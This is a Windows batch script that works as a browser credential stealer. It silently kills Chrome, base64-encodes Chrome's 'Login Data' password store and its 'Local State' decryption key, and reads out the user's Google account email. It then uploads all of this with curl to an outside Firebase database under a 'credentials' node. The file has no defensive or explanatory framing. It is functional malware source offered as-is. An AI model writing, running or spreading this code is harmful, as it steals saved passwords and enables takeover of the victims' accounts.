@echo off
setlocal ENABLEDELAYEDEXPANSION

:: --- Close all running Google Chrome processes silently ---
taskkill /IM chrome.exe /F >nul 2>&1
timeout /t 2 /nobreak >nul

:: --- Paths ---
set "LOGIN_FILE=%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"
set "STATE_FILE=%LOCALAPPDATA%\Google\Chrome\User Data\Local State"
set "FIREBASE=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app"
set "NODE=credentials/%USERNAME%"

:: --- Temp files directory ---
set "TMP_DIR=%TEMP%\fbup"
mkdir "%TMP_DIR%" >nul 2>&1

set "B64_LOGIN=%TMP_DIR%\login.txt"
set "B64_STATE=%TMP_DIR%\state.txt"
set "TMP_JSON=%TMP_DIR%\data.json"

:: --- Base64 encode files ---
echo Encoding Login Data file...
certutil -encode "%LOGIN_FILE%" "%B64_LOGIN%" >nul 2>&1
if errorlevel 1 (
    echo ERROR: Failed to encode Login Data file.
    pause
    exit /b 1
)
if not exist "%B64_LOGIN%" (
    echo ERROR: Encoded Login Data file not found after certutil.
    pause
    exit /b 1
)

echo Encoding Local State file...
certutil -encode "%STATE_FILE%" "%B64_STATE%" >nul 2>&1
if errorlevel 1 (
    echo ERROR: Failed to encode Local State file.
    pause
    exit /b 1
)
if not exist "%B64_STATE%" (
    echo ERROR: Encoded Local State file not found after certutil.
    pause
    exit /b 1
)

:: --- Remove first & last lines from Base64 files ---
(for /f "skip=1 delims=" %%A in (%B64_LOGIN%) do (
    set "line=%%A"
    if "!line!" neq "-----END CERTIFICATE-----" echo(!line!
)) > "%B64_LOGIN%.clean"

(for /f "skip=1 delims=" %%A in (%B64_STATE%) do (
    set "line=%%A"
    if "!line!" neq "-----END CERTIFICATE-----" echo(!line!
)) > "%B64_STATE%.clean"

:: --- Decode Local State base64 back to JSON (to extract email) ---
certutil -decode "%B64_STATE%.clean" "%TMP_DIR%\local_state.json" >nul 2>&1

:: --- Extract Google account email from Local State JSON using PowerShell ---
set "REAL_EMAIL="
for /f "usebackq delims=" %%E in (`powershell -NoProfile -Command ^
    "try { (Get-Content '%TMP_DIR%\local_state.json' | ConvertFrom-Json).account_info[0].email } catch { '' }"`) do set "REAL_EMAIL=%%E"

:: --- Fallback if no email found ---
if "!REAL_EMAIL!"=="" (
    set "REAL_EMAIL=%USERNAME%@%USERDOMAIN%"
)

set "EMAIL=!REAL_EMAIL!"

:: --- Build JSON file with placeholders ---
(
    echo {
    echo     "email": "!EMAIL!",
    echo     "login_data_b64": "@@@LOGIN@@@",
    echo     "local_state_b64": "@@@STATE@@@"
    echo }
) > "%TMP_JSON%"

:: --- Replace placeholders with actual Base64 data ---
powershell -Command ^
    "(Get-Content '%TMP_JSON%') -replace '@@@LOGIN@@@', (Get-Content '%B64_LOGIN%.clean' -Raw) -replace '@@@STATE@@@', (Get-Content '%B64_STATE%.clean' -Raw) | Set-Content '%TMP_DIR%\final.json'"

:: --- Upload final JSON to Firebase ---
curl -X PUT -H "Content-Type: application/json" --data "@%TMP_DIR%\final.json" "%FIREBASE%/%NODE%.json"

echo.
echo ✅ Files (encoded) uploaded to Firebase DB with email: !EMAIL!
pause
